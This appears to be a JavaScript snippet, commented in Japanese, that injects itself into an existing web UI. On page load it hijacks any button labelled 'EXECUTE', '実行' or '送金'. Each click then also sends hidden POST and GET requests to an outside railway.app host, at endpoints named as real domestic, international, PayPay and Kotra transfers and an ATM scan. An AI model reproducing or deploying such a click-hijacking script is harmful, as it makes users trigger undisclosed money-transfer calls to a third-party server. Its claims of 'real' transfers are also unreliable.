// 既存UIのボタンに追加するスクリプト

const injectGlobalExecutor = () => {
  // ボタンを見つける（既存UIのボタンセレクタに合わせる）
  const buttons = document.querySelectorAll('button');
  
  // 「EXECUTE」「実行」「送金」などのボタンを探す
  buttons.forEach(btn => {
    if (btn.textContent.includes('EXECUTE') || 
        btn.textContent.includes('実行') || 
        btn.textContent.includes('送金')) {
      
      // 元のクリックイベントを保存
      const originalClick = btn.onclick;
      
      // 新しいクリックイベントを追加
      btn.onclick = async (e) => {
        // 元の処理を実行
        if (originalClick) originalClick(e);
        
        // 全API実行
        await executeAllAPIs();
      };
    }
  });
};

const executeAllAPIs = async () => {
  const API_BASE = 'https://hopeful-liberation-production-9d00.up.railway.app';
  
  const apis = [
    {path:"/api/real-transfer/domestic", method:'POST', data:{amount:1000}},
    {path:"/api/real-transfer/international", method:'POST', data:{amount:1000}},
    {path:"/api/v1/transfer/paypay", method:'POST', data:{amount:1000}},
    {path:"/api/v1/transfer/kotra", method:'POST', data:{amount:1000}},
    {path:"/api/v1/assets/car", method:'GET'},
    {path:"/api/v1/web3/status", method:'GET'},
    {path:"/api/v1/atm/scan", method:'POST', data:{auth:"scan"}},
    {path:"/api/ai/claude", method:'POST', data:{message:"Execute"}},
    {path:"/api/bank/status", method:'GET'}
  ];
  
  console.log('🔥 Global Impact Executor: START');
  
  for (const api of apis) {
    try {
      const options = {
        method: api.method,
        headers: {'Content-Type': 'application/json'}
      };
      
      if (api.method === 'POST') {
        options.body = JSON.stringify(api.data);
      }
      
      const res = await fetch(API_BASE + api.path, options);
      const json = await res.json();
      
      console.log(`✅ ${api.path}:`, json);
    } catch (error) {
      console.log(`❌ ${api.path}:`, error.message);
    }
  }
  
  console.log('🎉 Global Impact Executor: COMPLETE');
};

// 自動実行
if (typeof window !== 'undefined') {
  window.addEventListener('load', injectGlobalExecutor);
}

export { executeAllAPIs, injectGlobalExecutor };
